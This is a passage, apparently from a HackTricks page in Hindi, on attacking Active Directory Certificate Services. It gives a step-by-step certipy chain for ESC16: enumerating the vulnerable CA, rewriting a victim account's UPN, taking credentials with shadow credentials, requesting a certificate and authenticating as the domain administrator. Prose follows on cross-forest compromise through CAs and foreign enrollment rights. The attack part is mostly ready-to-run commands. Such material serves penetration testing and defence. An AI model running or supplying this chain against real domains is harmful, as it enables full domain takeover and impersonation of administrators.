**चरण 3: "on-behalf-of" प्रमाणपत्र का उपयोग करके विशेषाधिकार प्राप्त उपयोगकर्ता के रूप में प्रमाणित करें।**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## CA पर Security Extension अक्षम (वैश्विक)-ESC16

### Explanation

**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** उस स्थिति को दर्शाता है जहाँ, यदि AD CS के कॉन्फ़िगरेशन में सभी प्रमाणपत्रों में **szOID_NTDS_CA_SECURITY_EXT** extension को शामिल करना अनिवार्य नहीं किया गया है, तो एक हमलावर इसका दुरुपयोग कर सकता है:

1. बिना **SID binding** के एक प्रमाणपत्र अनुरोध करके।

2. इस प्रमाणपत्र का उपयोग किसी भी खाते के रूप में प्रमाणीकरण के लिए करके, जैसे उच्च-प्रिविलेज खाते (उदा., a Domain Administrator) की impersonation करना।

आप इस लेख को भी देखकर विस्तार से सिद्धांत जान सकते हैं: https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6

### Abuse

निम्नलिखित को [इस लिंक](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally) में संदर्भित किया गया है, अधिक विस्तृत उपयोग विधियाँ देखने के लिए क्लिक करें।

यह पहचानने के लिए कि क्या Active Directory Certificate Services (AD CS) environment **ESC16** के प्रति संवेदनशील है
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**चरण 1: पीड़ित खाते का प्रारंभिक UPN पढ़ें (वैकल्पिक - पुनर्स्थापना के लिए).
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**चरण 2: पीड़ित खाते का UPN लक्ष्य व्यवस्थापक के `sAMAccountName` में अपडेट करें।**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**चरण 3: (यदि आवश्यक हो) "victim" खाते के लिए क्रेडेंशियल प्राप्त करें (उदा., Shadow Credentials के माध्यम से).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Step 4: ESC16-प्रभावित CA पर "victim" उपयोगकर्ता के रूप में _किसी भी उपयुक्त client authentication template_ (उदा., "User") से प्रमाणपत्र अनुरोध करें।** क्योंकि CA ESC16 के प्रति संवेदनशील है, यह जारी किए गए प्रमाणपत्र से SID security extension को स्वतः हटा देगा, भले ही template की इस extension के लिए विशिष्ट सेटिंग्स कुछ भी हों। Kerberos credential cache environment variable सेट करें (shell command):
```bash
export KRB5CCNAME=victim.ccache
```
फिर प्रमाणपत्र का अनुरोध करें:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Step 5: "victim" अकाउंट का UPN वापस करें।**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**चरण 6: लक्षित व्यवस्थापक के रूप में प्रमाणीकृत करें।**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## प्रमाणपत्रों के माध्यम से फॉरेस्ट का समझौता — Passive Voice में समझाया गया

### Compromised CAs द्वारा फॉरेस्ट ट्रस्ट्स का टूटना

cross-forest enrollment की configuration तुलनात्मक रूप से सरल बनाई जाती है। resource forest का root CA certificate प्रशासकों द्वारा account forests में प्रकाशित किया जाता है, और resource forest के enterprise CA certificates प्रत्येक account forest में `NTAuthCertificates` और AIA containers में जोड़े जाते हैं। स्पष्ट करने के लिए, यह व्यवस्था resource forest के CA को उन सभी अन्य forests पर complete control देती है जिनके लिए यह PKI को manage करता है। यदि यह CA attackers द्वारा compromised हो जाता है, तो resource और account दोनों forests के सभी users के certificates attackers द्वारा forged किए जा सकते हैं, जिससे फॉरेस्ट की security boundary टूट जाती है।

### विदेशी प्रिंसिपलों को दिए जाने वाले Enrollment अधिकार

multi-forest environments में सावधानी बरतनी चाहिए उन Enterprise CAs के संबंध में जो **publish certificate templates** करते हैं जो **Authenticated Users or foreign principals** (उस फॉरेस्ट के बाहर के users/groups जिनसे Enterprise CA संबंधित है) को **enrollment and edit rights** की अनुमति देती हैं।\
एक trust के पार authentication होने पर, AD द्वारा user के token में **Authenticated Users SID** जोड़ दिया जाता है। इसलिए, यदि किसी domain के पास ऐसा Enterprise CA है जिसका कोई template **allows Authenticated Users enrollment rights**, तो किसी अलग फॉरेस्ट के user द्वारा उस template में संभावित रूप से **enroll** किया जा सकता है। उसी तरह, यदि किसी template द्वारा explicitly किसी foreign principal को **enrollment rights** दिए जाते हैं, तो इससे **cross-forest access-control relationship** बन जाती है, जिससे एक फॉरेस्ट का प्रिंसिपल दूसरे फॉरेस्ट के template में **enroll** कर सकता है।

ये दोनों परिदृश्य एक फॉरेस्ट से दूसरे फॉरेस्ट तक के बीच **increase in the attack surface** का कारण बनते हैं। certificate template की settings का उपयोग किस्तमर (attacker) द्वारा कर के किसी विदेशी domain में अतिरिक्त privileges प्राप्त किए जा सकते हैं।

## References

- [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

{{#include ../../../banners/hacktricks-training.md}}
